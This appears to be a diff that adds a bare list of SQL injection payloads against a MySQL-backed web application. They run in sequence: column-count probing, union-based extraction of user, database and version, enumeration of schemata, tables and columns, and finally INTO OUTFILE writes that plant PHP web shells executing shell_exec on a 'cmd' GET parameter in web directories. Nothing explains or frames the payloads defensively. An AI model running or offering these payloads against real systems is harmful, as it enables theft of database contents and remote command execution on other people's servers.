@@ -1,0 +1,25 @@
+1' order by 4#
+
+1' union select 1,2,3,4  #####
+
+1' union select 1,concat(user(),0x3c62723e,database(),0x3c62723e,version()),3,4  #####
+
+
+1'union select 1,2,3,database() from information_schema.schemata#
+
+1'union select 1,2,3,table_name from information_schema.tables where table_schema='user_db'#
+
+1'union select 1,2,3,column_name from information_schema.columns where table_schema='user_db' and table_name='user_table'#
+
+1'union select 1,2,3,group_concat() from item#
+
+1' union select 1,2,3,'<?php phpinfo() ?>'  from item into outfile "/opt/lampp/Cequal/upfiles/100.php"; #######
+
+
+
+1' union select 1,2,3,"<?php echo shell_exec($_GET['cmd']) ?>"  from item into outfile "/var/www/html/upfiles/shell.php"; #######
+
+1' union select 1,2,3," <form action='/shell.php' method='get'>  <input type='submit' value='submit'> </form> <?php echo shell_exec($_GET['cmd']) ?>"  from item into outfile "/var/www/html/upfiles/shell.php"; #######
+
+
+select 1,2,3,4  from item into outfile "/opt/lampp/Cequal/upfiles/shell.php";
